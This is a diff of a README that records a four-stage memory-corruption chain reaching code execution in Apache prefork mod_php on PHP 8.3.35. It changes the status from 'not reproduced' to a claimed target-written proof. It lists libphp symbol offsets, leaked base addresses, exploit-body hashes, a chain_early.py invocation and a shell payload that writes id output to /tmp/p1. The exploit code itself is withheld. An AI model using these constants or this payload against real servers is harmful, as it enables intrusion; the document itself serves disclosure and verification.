@@ -1,6 +1,8 @@
-# `php:8.3.35-apache` — **not reproduced** (stage 1 only)
+# `php:8.3.35-apache` — Apache prefork mod_php full chain
 
-**Status: `not reproduced`.** The stock A1/B1 pair from this session's 8.4.1–8.4.7 lane was attempted on this build. A1 ends in a *parse-time* OOM; B1 returns a normal 26-character session id with no libphp pointers. No target-written file exists, so this directory has no `proofs/`.
+**Status: target-written proof.** 2/2 chain runs (`8335b_r1`, `8335b_r2`) ended
+with a `uid` file written by the exploited worker. The bodies are the recovered
+Oct-24 pair, rebuilt byte-identically from session-recorded generators.
 
 ## Target (measured)
 
@@ -10,58 +12,78 @@
 | image id | `sha256:90620e863c15e608cfebd058554d82d2c7fd816bdd690adc69027409cbb7a369` |
 | repo digest | `php@sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184` |
 | PHP | `PHP 8.3.35 (cli) (built: Oct 21 2026 00:33:53) (NTS)` |
-| SAPI | `Server version: Apache/2.4.69 (Debian)`, prefork mod_php |
-| MPM | `StartServers            5 / MinSpareServers         5 / MaxSpareServers         10 / MaxRequestWorkers       150 / MaxConnectionsPerChild  0` |
-| php.ini | unmodified `php.ini-production`, 73,397 B, `2533da00f66b1cf18430b08871262afa12f58cf2ee43b2077740c9c3972bb980` |
-| docroot | `/var/www/html` (read-only bind), endpoint `/index.php`, 22-byte stub |
-| libphp symbols | `zval_ptr_dtor = 0x49ec50`, `zif_system = 0x3ac080` (`nm -a`, recorded in the search log; no chain stage used them) |
+| SAPI | `Apache/2.4.69 (Debian)`, prefork mod_php |
+| MPM | stock prefork; `StartServers 5` and `MaxRequestWorkers 150` measured in the container config |
+| php.ini | `php.ini-production`, 73,397 B, `2533da00f66b1cf18430b08871262afa12f58cf2ee43b2077740c9c3972bb980`; `memory_limit=128M`, `display_errors=Off` |
+| docroot | `/var/www/html`, 22-byte `/index.php` stub, `1b97dc5177b5c4f4a53023a6c72629ce360e466f627d98cdf1d75113450faf23` |
+| ASLR | on at the host (`randomize_va_space=2`) |
+| traffic | loopback only; access logs contain only `127.0.0.1` and `172.17.0.1` |
 
-## What was run
+## Build constants
 
-| stage | attempt | status | response bytes | worker pid | observation |
-|---|---|---|---|---|---|
-| A1 | 1 | `HTTP/1.0 500 Internal Server Error` | 211 | 774 | error log: `tried to allocate 8192 bytes` — multipart parse abort, not END cleanup |
-| B1 | 0 | `HTTP/1.1 200 OK` | 253 | 774 | no pointers (decoded=34) |
-| B1 | 1 | `HTTP/1.1 200 OK` | 253 | 774 | no pointers (decoded=34) |
-| B1 | 2 | `HTTP/1.1 200 OK` | 253 | 774 | no pointers (decoded=34) |
+`zval_ptr_dtor = libphp + 0x49EC50` · `zif_system = libphp + 0x3AC080` ·
+`S = main + 0xF9398` · A2 fillers `115`
 
-B1 responses: `no pointers (decoded=34)`; `no pointers (decoded=34)`; `no pointers (decoded=34)`; the decoded `Set-Cookie` value is 34 bytes and contains no value in the pointer filter range (0x7C0000000000–0x800000000000), so no leak stage can start.
+## Bodies
 
-The pin itself was accepted (`parent=1, children=150, established=149`), so the failure is not pool routing.
+| body | bytes | sha256 |
+|---|---|---|
+| A1 `a1_8234.bin` | 1,060,869 | `673cc3175551a35934d9ac11dbe26d06d9b83c6b3e32db35272eed515ab0201c` |
+| B1 `b1_8234.bin` | 29,218,150 | `d4ef67293645f5beeafac1798f6fb92abed35fa90936b8a6fbfbcc522323e2d3` |
 
-## Exact blockers
+Both bodies were reconstructed byte-identically from session-recorded
+generators and match the recorded Oct-24 hashes. The 8.3.35 run reused this
+same pair; the filenames retain their 8.2.34 origin. They are not shipped in
+this repository. The proof uses the 29,218,150 B B1 body and the 149-holder
+pin. `c1.bin` is not an input to this chain and is not shipped.
 
-1. **The stock early A1 never reaches END cleanup on this build either.** The same
-   `a1_early.bin` produces a parse-time OOM (`tried to allocate 8192 bytes`), B1 returns a
-   fresh 26-character session id and no value in the pointer filter range.
-2. **No 8.3.35-specific calibration exists.** Unlike 8.2.34 there is no preserved priming
-   body, no END-phase OOM record and no B1 geometry for 8.3.35 anywhere in the project
-   tree; this session's attempt is the only record.
-3. **What would be needed:** an A1 that reaches `php_session_reset_id` cleanup with
-   `PS(status)=2` / `PS(send_cookie)=1` on 8.3.35 (a `mk_a1c.py`-style tune of
-   `--parts/--big/--tailk/--tailk2` against this build's 128 M limit), then a B1 body that
-   reuses the freed chunk. Without the first, no B1 geometry can leak.
-4. **A1-only is not a chain.** No target-written file exists; this directory must not be
-   read as RCE.
+## Runs
+
+| run | tag | A1 | B1 | A2 | B2 | decoded / hits | proof capture |
+|---|---|---|---|---|---|---|---|
+| 1 | `8335b_r1` | 500 / 211 B | 200 / 1,380,063 B | 500 / 211 B | 0 B / SIGSEGV | 1,169,032 / 584 | `proof/proof_8335b_r1.txt` |
+| 2 | `8335b_r2` | 500 / 211 B | 200 / 1,380,063 B | 500 / 211 B | 0 B / SIGSEGV | 1,169,032 / 584 | `proof/proof_8335b_r2.txt` |
+
+Both runs used the same container after the pool recovered from the first
+SIGSEGV. The leak bases were identical: `main=0x7fd639000000`,
+`libphp=0x7fd63ad56000`, `S=0x7fd6390f9398`, `zif_system=0x7fd63b102080`.
+
+The error log proves the same child served all four stages: pid 186 for
+`8335b_r1` and pid 253 for `8335b_r2` carry the A1 4096-byte OOM, the B1
+session warnings, the A2 20480-byte OOM and the B2 SIGSEGV.
+
+## Proof provenance
+
+The B2 request body carries `id>/tmp/p1; echo PWNED_<tag> >>/tmp/p1`. The
+host-side harness never executes `id` and never writes `/tmp/p1`; the driver
+deletes the path inside the container immediately before the run and only cats
+it after the run. The file is owned by `www-data:www-data` (uid/gid 33) and
+contains the `id` output plus the tag. B2 returns 0 bytes and the child dies
+with SIGSEGV after the marker is written.
+
+The in-container marker is 69 B. The published captures are 124 B
+(`proof_8335b_r2.txt`: stat, uid and tag) and 1,995 B
+(`proof_8335b_r1.txt`: the same plus an appended error-log excerpt). The
+1,995 B figure is the capture size, not the marker size.
 
 ## Evidence files
 
-- `evidence/result.json` — per-stage record (paths, container name, host port redacted).
-- `evidence/responses/` — raw A1 and B1 responses.
-- `evidence/logs/` — raw Apache access/error logs.
-- `evidence/config/`, `evidence/docroot/` — the exact mounted files.
-- `evidence/env.json` — image digest, versions, hashes.
+- `report.md` — full redacted report.
+- `commands.txt` — exact commands with `<RUNDIR>`, `<container>` and `<PORT>`
+  placeholders.
+- `proof/` — the two target-written `uid` captures, verbatim.
+- `decoded/` — the two decoded leak JSON files.
+- `evidence/` — the earlier negative public rerun, preserved and marked
+  superseded.
+- `sha256sums.txt` — hashes for this directory.
 
-## Next concrete command
+## Reproduction
 
-```bash
-# 1) First recover or regenerate an A1 that reaches END cleanup (see blockers).
-# 2) Measure this build's S anchor; do not reuse the 8.4.x 0xED398 value.
-# 3) Then run the chain with the recovered bodies:
-python3 tools/chain_early.py --container <container> --port <PORT> \
-  --tag PR8335A --build 8.3.35 --zdtor 0x49ec50 --zif 0x3ac080 --soff <S-offset> \
-  --a1 <a1-reaching-END>.bin --b1 <b1-geometry>.bin --fillers 115 \
-  --outdir out/8.3.35 --logdir logs
+See `commands.txt` for the body regeneration, the stock container and the R1
+driver invocation. The driver and body files are retained privately; the
+commands record the measured sequence and constants. Verify this directory with:
+
+```sh
+cd receipts/php-8.3.35
+sha256sum -c sha256sums.txt
 ```
-
-Without step 1 there is no runnable chain command for this build; the exact attempt that produced the records here is in `../../commands.txt` (section `8.3.35`).
